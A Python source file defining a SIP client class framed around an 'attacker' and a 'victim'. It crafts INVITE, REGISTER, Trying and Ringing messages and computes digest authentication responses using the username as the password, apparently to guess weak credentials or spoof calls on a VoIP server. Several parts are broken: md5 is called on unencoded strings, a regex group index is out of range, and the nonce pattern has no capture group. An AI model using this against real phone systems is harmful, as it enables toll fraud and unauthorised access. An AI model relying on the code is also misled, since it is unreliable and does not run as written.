import re

from random import randint
from hashlib import md5

class SipClient:
    def __init__(self, attacker_number, attacker_port, host, victim_number):
        self._branch=md5(str(randint(0,99999999))).hexdigest() # type: ignore
        self._attacker_number = attacker_number
        self._host = host
        self._victim_number = victim_number
        self._qop = ""
        self._realm = ""
        self._nonce = ""
        self._nc = "00000001"
        self._cnonce = md5(str(randint(0,99999999))).hexdigest() # type: ignore
        self._method = "INVITE"
        self._callid = md5(str(randint(0,99999999))).hexdigest() # type: ignore
        self._from_tag = md5(str(randint(0,999999))).hexdigest() # type: ignore
        self._to_tag = md5(str(randint(0,999999))).hexdigest() # type: ignore
        self._cseq=randint(0,9999)
        self._response = ""
        self._attacker_port = str(attacker_port)

    def invite_message(self):
        victim = "%s@%s"%(self._victim_number, self._host)
        sip_message = """INVITE sip:%s SIP/2.0
Via: SIP/2.0/UDP 192.168.20.33:%s;rport;branch=z9hG4bK%s
Max-Forwards: 70
From: <sip:%s@%s>;tag=%s
To: <sip:%s>
Contact: <sip:%s@192.168.20.33:%s;ob>
Call-ID: %s
CSeq: %s INVITE
Allow: PRACK, INVITE, ACK, BYE, CANCEL, UPDATE, INFO, SUBSCRIBE, NOTIFY, REFER, MESSAGE, OPTIONS
Supported: replaces, 100rel, timer, norefersub
Session-Expires: 1800
Min-SE: 90
User-Agent: MicroSIP/3.21.3
Content-Type: application/sdp
Content-Length:   343

v=0
o=- 3908291298 3908291298 IN IP4 192.168.20.33
s=pjmedia
b=AS:84
t=0 0
a=X-nat:0
m=audio 4004 RTP/AVP 8 0 101
c=IN IP4 192.168.20.33
b=TIAS:64000
a=rtcp:4005 IN IP4 192.168.20.33
a=sendrecv
a=rtpmap:8 PCMA/8000
a=rtpmap:0 PCMU/8000
a=rtpmap:101 telephone-event/8000
a=fmtp:101 0-16
a=ssrc:1362438962 cname:11d71c8121fe1107
""" %(victim, self._attacker_port, self._branch, self._attacker_number, self._host, self._from_tag, \
    victim, self._attacker_number, self._attacker_port, self._callid, str(self._cseq))

        return sip_message.replace("\n","\r\n")

    def dissect_authorization_response(self, response):
        digests = re.search("(Digest )", response)
        assert digests
        if digests.groups()[1] is None:
            raise Exception('Authorization is not digest.')
        result = re.search("qop=\"([a-z]+)\"", response)
        assert result
        self._qop = result.group(1)
        if self._qop != "auth":
            raise Exception('qop is not auth.')
        result2 = re.search("realm=\"([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})\"", response)
        assert result2
        self._realm = result2.group(1)
        result3 = re.search("nonce=\"[0-9a-f\-]+\"", response)
        assert result3
        self._nonce = result3.group(1)

    def sip_digest_calculator(self, username):
        digestURI="sip:%s@%s"%(self._victim_number, self._host)
        response_string1 = "%s:%s:%s"%(username, self._realm, username)

        # Step 2: Hash concatenated string
        HA1 = md5(response_string1.encode()).hexdigest() # type: ignore

        # Step 3: Concatenate HA1 with nonce and HA2
        HA2_string = "%s:%s"%(self._method, digestURI)
        HA2 = md5(HA2_string.encode()).hexdigest() # type: ignore

        # Step 4: Concatenate HA1, nonce, nc, cnonce, qop and HA2
        response_string2 = "%s:%s:%s:%s:%s:%s"%(HA1, self._nonce, self._nc, self._cnonce, self._qop, HA2)

        # Step 5: Hash final string
        self._response = md5(response_string2.encode()).hexdigest() # type: ignore

    def register(self, expire):
        sip_message = """REGISTER sip:192.168.21.58 SIP/2.0
Via: SIP/2.0/UDP 192.168.20.33:%s;rport;branch=z9hG4bKeb1a0e68887a4cc0acdd8e27ae2821b8
Max-Forwards: 70
From: <sip:1002@192.168.21.58>;tag=c09a61d483a345a782c8c3710efa5aa1
To: <sip:1002@192.168.21.58>
Call-ID: b9d2f292585840cca32d09b886a043fc
CSeq: 46438 REGISTER
User-Agent: MicroSIP/3.21.3
Contact: <sip:1002@192.168.20.33:%s;ob>
Expires: %s
Allow: PRACK, INVITE, ACK, BYE, CANCEL, UPDATE, INFO, SUBSCRIBE, NOTIFY, REFER, MESSAGE, OPTIONS
Content-Length:  0

"""%(self._attacker_port, self._attacker_port, expire)

        return sip_message.replace("\n","\r\n")

    def trying_100(self, response):
        self.update_from_tag(response)
        self.update_call_id(response)
        self.update_branch(response)
        sip_message = """SIP/2.0 100 Trying
Via: SIP/2.0/UDP %s;rport=5060;received=%s;branch=z9hG4bK%s
Call-ID: %s
From: "%s" <sip:%s@%s>;tag=%s
To: <sip:1002@192.168.20.33;ob>
CSeq: %s INVITE
Content-Length:  0

""" %(self._host, self._host, self._branch, self._callid, self._attacker_number, self._attacker_number, self._host, self._from_tag, str(self._cseq))
        return sip_message.replace("\n","\r\n")

    def ringing_180(self):
        sip_message = """SIP/2.0 180 Ringing
Via: SIP/2.0/UDP %s;rport=5060;received=%s;branch=z9hG4bK%s
Call-ID: %s
From: "%s" <sip:%s@%s>;tag=%s
To: <sip:1002@192.168.20.33;ob>;tag=%s
CSeq: %s INVITE
Contact: <sip:1002@192.168.20.33:%s;ob>
Allow: PRACK, INVITE, ACK, BYE, CANCEL, UPDATE, INFO, SUBSCRIBE, NOTIFY, REFER, MESSAGE, OPTIONS
Content-Length:  0

""" %(self._host, self._host, self._branch, self._callid, self._attacker_number, self._attacker_number, self._host, self._from_tag, self._to_tag, str(self._cseq), self._attacker_port)
        return sip_message.replace("\n","\r\n")

    @staticmethod
    def remove_cariage(text):
        return text.replace("\r","")

    def update_from_tag(self, response):
        from_tag = re.search("From: .*;tag=(.*)", response)
        assert from_tag
        self._from_tag = SipClient.remove_cariage(from_tag.group(1))
    
    def update_call_id(self, response):
        call_id = re.search("Call-ID: (.*)", response)
        assert call_id
        self._callid = SipClient.remove_cariage(call_id.group(1))
    
    def update_branch(self, response):
        branch = re.search("Via: .*;branch=z9hG4bK(.*)", response)
        assert branch
        self._branch = SipClient.remove_cariage(branch.group(1))
